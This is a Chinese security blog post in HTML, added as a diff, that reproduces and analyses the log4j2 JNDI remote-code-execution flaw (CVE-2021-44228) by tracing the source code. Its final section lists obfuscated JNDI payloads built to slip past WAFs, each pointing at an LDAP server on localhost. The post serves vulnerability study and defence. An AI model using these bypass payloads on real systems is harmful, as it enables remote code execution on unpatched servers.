@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p0melo">
+    
+    <title>
+        
+            log4j2 RCE分析与复现 |
+        
+        p0melo
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/p0melo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/p0melo.svg","favicon":"/images/p0melo.svg","article_img_align":"left","left_side_width":"300px","content_max_width":"950px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/pexels-vitaly-kushnir.jpg","description":"Stay Hungry Stay Foolish."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":false,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                p0melo
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">log4j2 RCE分析与复现</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/p0melo.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">p0melo</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2022-01-22 18:01:45
+    </span>
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的:smile:</p>
+<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">
+
+<p>或者换做直接引<code>log4j</code>的包也是OK的。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768">
+
+<p>通过JNDI注入利用<a class="link"   target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880">
+
+<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，调试等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452">
+
+<p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559">
+
+<p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935">
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> </span>&#123;</span><br><span class="line">    Message msg = event.getMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> doRender = <span class="keyword">this</span>.textRenderer != <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder workingBuilder = doRender ? <span class="keyword">new</span> StringBuilder(<span class="number">80</span>) : toAppendTo;</span><br><span class="line">        <span class="keyword">int</span> offset = workingBuilder.length();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">            ((MultiFormatStringBuilderFormattable)msg).formatTo(<span class="keyword">this</span>.formats, workingBuilder);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.config != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.noLookups) &#123;  <span class="comment">// 2.14.1及一下版本的noLookups默认为false</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">                <span class="comment">// 判断log内容是否包含&#x27;$&#123;&#x27;</span></span><br><span class="line">                <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                    String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                    workingBuilder.setLength(offset);</span><br><span class="line">                    <span class="comment">// 跟入replace方法</span></span><br><span class="line">                    workingBuilder.append(<span class="keyword">this</span>.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>org.apache.logging.log4j.core.util.Constants</code>类中可以看到noLookpus默认为false</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">boolean</span> FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><p>跟入<code>org.apache.logging.log4j.core.lookup.StrSubstitutor</code>类的<code>replace</code>方法，里面调用<code>StrSubstitutor</code>类的<code>substitute</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replace</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String source)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        StringBuilder buf = <span class="keyword">new</span> StringBuilder(source);</span><br><span class="line">        <span class="comment">// 跟入</span></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">this</span>.substitute(event, buf, <span class="number">0</span>, source.length()) ? source : buf.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">substitute</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="keyword">int</span> offset, <span class="keyword">final</span> <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.substitute(event, buf, offset, length, (List)<span class="keyword">null</span>) &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着看看<code>StrSubstitutor</code>类，定义了一些类型为<code>org.apache.logging.log4j.core.lookup.StrMatcher</code>的成员变量，如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span> DEFAULT_ESCAPE = <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_PREFIX = StrMatcher.stringMatcher(<span class="string">&quot;$&#123;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_SUFFIX = StrMatcher.stringMatcher(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_VALUE_DELIMITER_STRING = <span class="string">&quot;:-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:-&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ESCAPE_DELIMITER_STRING = <span class="string">&quot;:\\-&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StrMatcher DEFAULT_VALUE_ESCAPE_DELIMITER = StrMatcher.stringMatcher(<span class="string">&quot;:\\-&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>可以理解<code>StrMatcher</code>类为<code>log4j</code>内置的字符匹配器，先看下该类的<code>isMath</code>方法，可以看到是指定一个char数组的起始位置和匹配长度去匹配另一个char数组，若完全匹配上则返回匹配上的长度，没匹配上返回<code>0</code>，该方法在接下来的<code>substitute</code>方法中会用到较多，所以这里提一下</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123190427560.png" class="" title="image-20220123174526935">
+
+<p>接下来看<code>StrSubstitutor</code>类的<code>substitute</code>，该方法就是本次漏洞触发的关键方法</p>
+<p>先while循环去匹配字符串中的前缀字符<code>$&#123;</code></p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123192824964.png" class="" title="image-20220123192824964">
+
+<p>接着将前缀<code>$&#123;</code>后面的字符串通过while循环匹配后缀<code>&#125;</code>，在while循环中匹配后缀之前，会先判断剩下的字符串是否还存在前缀，每匹配一次前缀则<code>nestedVarCount</code>加一，当该变量不为<code>0</code>且匹配中一次后缀<code>&#125;</code>会减一，通过该变量来匹配出最外层<code>$&#123;&#125;</code>包裹的表达式，然后将匹配后的表达式继续往下递归，以满足嵌套的场景</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123194612458.png" class="" title="image-20220123194612458">
+
+<p>接着判断是否包含<code>:-</code>和<code>:\-</code>分割符，然后做一些分割处理（绕过思路1），这里判断较多，就不挨个描述，简单概括为</p>
+<ul>
+<li><code>:-</code> 是一个分割符，如果程序处理到 <code>$&#123;aaaa:-bbbb&#125;</code> 这样的字符串，处理的结果将会是 <code>bbbb</code>，<code>:-</code> 关键字将会被截取掉，而之前的字符串都会被舍弃掉。</li>
+<li><code>:\-</code> 是转义的 <code>:-</code>，如果一个用 <code>a:b</code> 表示的键值对的 key <code>a</code> 中包含 <code>:</code>，则需要使用转义来配合处理，例如 <code>$&#123;aaa:\\-bbb:-ccc&#125;</code>，代表 key 是，<code>aaa:bbb</code>，value 是 <code>ccc</code>。</li>
+</ul>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123203000204.png" class="" title="image-20220123203000204">
+
+<p>在没有匹配上分隔符或分割处理完后，会调用<code>resolveVariable</code>方法进行解析，将返回的结果替换回原字符串后，再次调用 <code>substitute</code> 方法进行递归解析</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210610548.png" class="" title="image-20220123210610548">
+
+<h3 id="Lookup"><a href="#Lookup" class="headerlink" title="Lookup"></a>Lookup</h3><p><code>resolveVariable</code>方法会调用<code>resolver</code>解析器的<code>lookup</code>方法，可以看到这里<code>resolver</code>支持12种类型的<code>lookup</code>实现（变形思路2）</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123204742879.png" class="" title="image-20220123204742879">
+
+<p>接着跟入<code>lookup</code>方法，来到了<code>org.apache.logging.log4j.core.lookup.Interpolator</code>拦截器，该拦截器通过不同前缀分配对应的<code>lookup</code>方法实现</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210035434.png" class="" title="image-20220123210035434">
+
+<p>继续跟进<code>lookup</code>可以看到，我们传入的是jndi前缀，所以会调用<code>org.apache.logging.log4j.core.lookup.JndiLookup</code>的<code>lookup</code>方法，到这就触发漏洞了。</p>
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123210252342.png" class="" title="image-20220123210252342">
+
+<h2 id="0x02-变形思路"><a href="#0x02-变形思路" class="headerlink" title="0x02 变形思路"></a>0x02 变形思路</h2><h3 id="增加-干扰"><a href="#增加-干扰" class="headerlink" title="增加:-干扰"></a>增加<code>:-</code>干扰</h3><p>上面说到当字符串种包含<code>:-</code>和<code>:\-</code>会做一些处理，我们就可以该处理逻辑来变形绕过一些waf，例如<code>$&#123;$&#123;p0melo:-j&#125;ndi:ldap://127.0.0.1:1389/kk2err&#125;</code></p>
+<h3 id="嵌套其他协议"><a href="#嵌套其他协议" class="headerlink" title="嵌套其他协议"></a>嵌套其他协议</h3><p>上面可以看到<code>StrLookup</code>除了支持jndi协议还支持<code>&#123;date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j&#125;</code>，所以我们可以通过其他协议变形payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;di:$&#123;lower::::l&#125;dap:<span class="comment">//127.0.0.1:1389/kk2err&#125; // 可以嵌套多个</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p>当然我们也可以组合上面两种思路，例如</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:$&#123;p0melo:-j&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br><span class="line">$&#123;$&#123;p0melo:-$&#123;lower:J&#125;&#125;ndi:ldap:<span class="comment">//127.0.0.1:1389/kk2err&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123221821111.png" class="" title="image-20220123221821111">
+
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/01/15/%E3%80%8A%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%88%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%EF%BC%89%E3%80%8B%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">《静态程序分析（南京大学）》课程笔记</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+            <div class="comment-container">
+                <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments">&nbsp;Comments</i>
+    </div>
+    
+
+        
+            
+    <div class="valine-container">
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
+        <div id="vcomments"></div>
+        <script >
+            function loadValine() {
+                new Valine({
+                    el: '#vcomments',
+                    appId: 'E3140V5fTteP8KzwJweuefl2-gzGzoHsz',
+                    appKey: 'Wo0PLY3dWpTTzUDW3Hbj6Gud',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '欢迎吐槽~',
+                    lang: 'en'.toLowerCase()
+                });
+
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
+
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = 'p0melo';
+
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
+
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">p0melo</a>
+        </div>
+        
+		<!--
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+		-->
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
